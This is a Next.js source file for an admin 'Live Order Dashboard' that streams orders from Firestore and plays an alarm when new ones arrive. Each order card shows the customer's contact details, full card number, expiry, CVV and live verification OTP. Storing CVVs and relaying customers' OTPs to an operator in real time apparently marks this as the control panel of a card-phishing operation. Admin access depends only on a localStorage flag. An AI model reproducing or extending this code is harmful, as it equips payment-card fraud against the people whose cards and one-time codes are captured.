'use client';

import { useState, useEffect, useRef, useCallback, useMemo } from 'react';
import { useRouter } from 'next/navigation';
import { db } from '@/lib/firebase';
import { collection, onSnapshot, query, orderBy, Timestamp } from 'firebase/firestore';
import type { Order } from '@/lib/types';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { LogOut, BellRing, Package, User, CreditCard, ShieldCheck, Pin, PinOff, ChevronLeft, ChevronRight, Timer, CheckCircle2 } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { cn } from '@/lib/utils';

const ORDERS_PER_PAGE = 10;

export default function AdminDashboard() {
  const router = useRouter();
  const [orders, setOrders] = useState<Order[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const isInitialLoad = useRef(true);

  // State for pinning and pagination
  const [pinnedOrderId, setPinnedOrderId] = useState<string | null>(null);
  const [currentPage, setCurrentPage] = useState(1);

  // Load pinned order from localStorage on component mount
  useEffect(() => {
    const savedPin = localStorage.getItem('pinnedOrderId');
    if (savedPin) {
      setPinnedOrderId(savedPin);
    }
  }, []);

  // Save pinned order to localStorage whenever it changes
  useEffect(() => {
    if (pinnedOrderId) {
      localStorage.setItem('pinnedOrderId', pinnedOrderId);
    } else {
      localStorage.removeItem('pinnedOrderId');
    }
  }, [pinnedOrderId]);

  // Longer, more noticeable alarm sound
  const playAlarmSound = useCallback(() => {
    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
    if (!audioContext) return;

    const playNote = (frequency: number, startTime: number, duration: number) => {
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);

        oscillator.type = 'sine';
        oscillator.frequency.value = frequency;
        gainNode.gain.setValueAtTime(0.25, audioContext.currentTime + startTime);
        gainNode.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + startTime + duration);
        
        oscillator.start(audioContext.currentTime + startTime);
        oscillator.stop(audioContext.currentTime + startTime + duration);
    };

    const now = audioContext.currentTime;
    const noteDuration = 0.2;
    const interval = 0.25;
    let time = now;

    // Create a 5-second sequence
    for(let i=0; i < (5 / interval); i++) {
        if (i % 4 === 0) {
            playNote(880, time, noteDuration); // A5
        } else if (i % 4 === 2) {
            playNote(659.25, time, noteDuration); // E5
        }
        time += interval;
    }
  }, []);

  useEffect(() => {
    if (localStorage.getItem('isAdminLoggedIn') !== 'true') {
      router.replace('/admin/login');
      return;
    }

    const q = query(collection(db, 'orders'), orderBy('createdAt', 'desc'));
    const unsubscribe = onSnapshot(q, (querySnapshot) => {
      const fetchedOrders: Order[] = [];
      querySnapshot.forEach((doc) => {
        fetchedOrders.push({ ...doc.data(), orderId: doc.id } as Order);
      });
      setOrders(fetchedOrders);
      
      // Play sound only for newly added orders after the initial load
      if (!isInitialLoad.current && querySnapshot.docChanges().some(change => change.type === 'added')) {
        playAlarmSound();
      } else {
        isInitialLoad.current = false;
      }
      setIsLoading(false);
    }, (error) => {
      console.error("Error fetching real-time orders:", error);
      setIsLoading(false);
    });

    return () => unsubscribe();
  }, [router, playAlarmSound]);

  const handleLogout = () => {
    localStorage.removeItem('isAdminLoggedIn');
    router.push('/admin/login');
  };

  const orderStats = useMemo(() => {
    return {
        total: orders.length,
        pending: orders.filter(o => o.status === 'pending_otp').length,
        completed: orders.filter(o => o.status === 'completed').length
    }
  }, [orders]);
  
  // Memoized logic for sorting and pagination
  const sortedOrders = useMemo(() => {
    const pinnedOrder = orders.find(o => o.orderId === pinnedOrderId);
    const otherOrders = orders.filter(o => o.orderId !== pinnedOrderId);
    return pinnedOrder ? [pinnedOrder, ...otherOrders] : orders;
  }, [orders, pinnedOrderId]);

  const totalPages = Math.ceil(sortedOrders.length / ORDERS_PER_PAGE);
  const paginatedOrders = useMemo(() => sortedOrders.slice(
    (currentPage - 1) * ORDERS_PER_PAGE,
    currentPage * ORDERS_PER_PAGE
  ), [sortedOrders, currentPage]);

  useEffect(() => {
    if (currentPage > totalPages && totalPages > 0) {
      setCurrentPage(1);
    }
  }, [currentPage, totalPages]);


  const handlePinToggle = (orderId: string) => {
    setPinnedOrderId(prev => (prev === orderId ? null : orderId));
  };

  const handleNextPage = () => setCurrentPage(prev => Math.min(prev + 1, totalPages));
  const handlePrevPage = () => setCurrentPage(prev => Math.max(prev - 1, 1));

  const formatTimestamp = (timestamp: Timestamp | Date) => {
    if (!timestamp) return 'N/A';
    const date = (timestamp as Timestamp).toDate ? (timestamp as Timestamp).toDate() : (timestamp as Date);
    return date.toLocaleString();
  };
  
  const PaginationControls = () => (
    <div className="flex items-center justify-center gap-4 mt-8">
      <Button onClick={handlePrevPage} disabled={currentPage === 1} variant="outline">
          <ChevronLeft className="h-4 w-4 mr-2" /> Previous
      </Button>
      <span className="font-body text-sm text-muted-foreground">
          Page {currentPage} of {totalPages === 0 ? 1 : totalPages}
      </span>
      <Button onClick={handleNextPage} disabled={currentPage === totalPages || totalPages === 0} variant="outline">
          Next <ChevronRight className="h-4 w-4 ml-2" />
      </Button>
    </div>
  );

  const StatsCards = () => (
    <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3 mb-8">
        <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                <CardTitle className="text-sm font-medium">Total Orders</CardTitle>
                <Package className="h-4 w-4 text-muted-foreground" />
            </CardHeader>
            <CardContent>
                <div className="text-2xl font-bold">{orderStats.total}</div>
                <p className="text-xs text-muted-foreground">All-time orders received</p>
            </CardContent>
        </Card>
        <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                <CardTitle className="text-sm font-medium">Pending Orders</CardTitle>
                <Timer className="h-4 w-4 text-muted-foreground" />
            </CardHeader>
            <CardContent>
                <div className="text-2xl font-bold">{orderStats.pending}</div>
                 <p className="text-xs text-muted-foreground">Awaiting OTP verification</p>
            </CardContent>
        </Card>
        <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                <CardTitle className="text-sm font-medium">Completed Orders</CardTitle>
                <CheckCircle2 className="h-4 w-4 text-muted-foreground" />
            </CardHeader>
            <CardContent>
                <div className="text-2xl font-bold">{orderStats.completed}</div>
                 <p className="text-xs text-muted-foreground">Successfully verified and paid</p>
            </CardContent>
        </Card>
    </div>
  );

  if (isLoading) {
    return <div className="flex h-screen items-center justify-center"><BellRing className="h-8 w-8 animate-pulse" /> <span className="ml-4 text-xl">Loading Live Orders...</span></div>;
  }
  
  return (
    <div className="min-h-screen bg-muted/40 p-4 sm:p-8">
      <header className="flex justify-between items-center mb-8">
        <div>
          <h1 className="text-3xl font-bold text-primary font-headline">Live Order Dashboard</h1>
          <p className="text-muted-foreground font-body">Real-time order notifications</p>
        </div>
        <Button onClick={handleLogout} variant="outline">
          <LogOut className="mr-2 h-4 w-4" />
          Logout
        </Button>
      </header>

      <StatsCards />
      
      <main className="space-y-6">
        {orders.length === 0 ? (
          <Card>
            <CardContent className="p-10 text-center text-muted-foreground">
              <BellRing className="mx-auto h-12 w-12 mb-4"/>
              <h3 className="text-xl font-semibold">No orders yet</h3>
              <p>New orders will appear here in real-time.</p>
            </CardContent>
          </Card>
        ) : (
          <>
            {paginatedOrders.map(order => {
              const isPinned = order.orderId === pinnedOrderId;
              return (
                <Card key={order.orderId} className={cn('border-2 transition-all duration-300', {
                    'border-blue-500 shadow-2xl ring-4 ring-blue-500/20': isPinned,
                    'border-yellow-500 bg-yellow-50': !isPinned && order.status === 'pending_otp',
                    'border-green-500 bg-green-50': !isPinned && order.status === 'completed'
                })}>
                  <CardHeader>
                    <div className="flex justify-between items-start">
                        <div>
                            <CardTitle className="flex items-center gap-2">
                                <Package /> Order ID: {order.orderId}
                            </CardTitle>
                            <CardDescription>Received at: {formatTimestamp(order.createdAt)}</CardDescription>
                        </div>
                        <div className="flex items-center gap-4">
                            <div className="font-bold text-xl text-primary" title="Total Amount">
                                ${order.totalAmount.toFixed(2)}
                            </div>
                            
                            {order.otp && (
                                <>
                                <Separator orientation="vertical" className="h-6" />
                                <div className="flex items-center gap-2 text-green-600" title="Verification OTP">
                                    <ShieldCheck className="h-5 w-5" />
                                    <span className="text-lg font-bold tracking-widest">{order.otp}</span>
                                </div>
                                </>
                            )}

                            <Badge variant={order.status === 'completed' ? 'default' : 'destructive'} className={order.status === 'completed' ? 'bg-green-600' : 'bg-yellow-600'}>
                                {order.status === 'completed' ? 'Completed' : 'Pending OTP'}
                            </Badge>
                            
                            <Button variant="ghost" size="icon" onClick={() => handlePinToggle(order.orderId)} title={isPinned ? 'Unpin Order' : 'Pin Order'}>
                                {isPinned ? <PinOff className="h-5 w-5 text-blue-600" /> : <Pin className="h-5 w-5 text-muted-foreground hover:text-primary" />}
                            </Button>
                        </div>
                    </div>
                  </CardHeader>
                  <CardContent className="grid grid-cols-1 md:grid-cols-3 gap-6 text-sm">
                    {/* Customer Details Column */}
                    <div className="space-y-4">
                        <h4 className="font-semibold flex items-center gap-2 text-primary"><User />Customer Details</h4>
                        <div className="space-y-1.5">
                            <div className="flex justify-between">
                                <span className="text-muted-foreground">Name:</span>
                                <span className="font-medium text-right">{order.userDetails.name}</span>
                            </div>
                            <div className="flex justify-between">
                                <span className="text-muted-foreground">Email:</span>
                                <span className="font-medium text-right truncate">{order.userDetails.email}</span>
                            </div>
                            <div className="flex justify-between">
                                <span className="text-muted-foreground">Phone:</span>
                                <span className="font-medium text-right">{order.userDetails.phone}</span>
                            </div>
                            <div className="flex justify-between items-start gap-2">
                                <span className="text-muted-foreground shrink-0">Address:</span>
                                <span className="font-medium text-right">{order.userDetails.address}</span>
                            </div>
                        </div>
                    </div>

                    {/* Payment Details Column */}
                    <div className="space-y-4">
                        <h4 className="font-semibold flex items-center gap-2 text-primary"><CreditCard />Payment Details</h4>
                        <div className="space-y-1.5">
                            <div className="flex justify-between">
                                <span className="text-muted-foreground">Cardholder:</span>
                                <span className="font-medium text-right">{order.paymentDetails.cardName}</span>
                            </div>
                            <div className="flex justify-between">
                                <span className="text-muted-foreground">Card Number:</span>
                                <span className="font-medium text-right">{order.paymentDetails.cardNumber}</span>
                            </div>
                            <div className="flex justify-between">
                                <span className="text-muted-foreground">Expiry:</span>
                                <span className="font-medium text-right">{order.paymentDetails.expiryDate}</span>
                            </div>
                            <div className="flex justify-between">
                                <span className="text-muted-foreground">CVV:</span>
                                <span className="font-bold text-red-600 text-right">{order.paymentDetails.cvv}</span>
                            </div>
                            <div className="flex justify-between">
                                <span className="text-muted-foreground">Card Type:</span>
                                <span className="font-medium text-right">{order.paymentDetails.cardType}</span>
                            </div>
                        </div>
                    </div>
                    
                    {/* Order Items Column */}
                    <div>
                        <h4 className="font-semibold flex items-center gap-2 text-primary mb-2"><Package />Order Items</h4>
                        <ul className="space-y-2">
                            {order.items.map((item, index) => (
                            <li key={index} className="flex justify-between border-b pb-1.5 items-start">
                                <div>
                                    <span>{item.name}</span>
                                    <span className="text-muted-foreground text-xs"> x {item.quantity}</span>
                                </div>
                                <span className="font-medium">${item.subtotal.toFixed(2)}</span>
                            </li>
                            ))}
                        </ul>
                    </div>
                  </CardContent>
                </Card>
              )
            })}
            {totalPages > 1 && <PaginationControls />}
          </>
        )}
      </main>
    </div>
  );
}
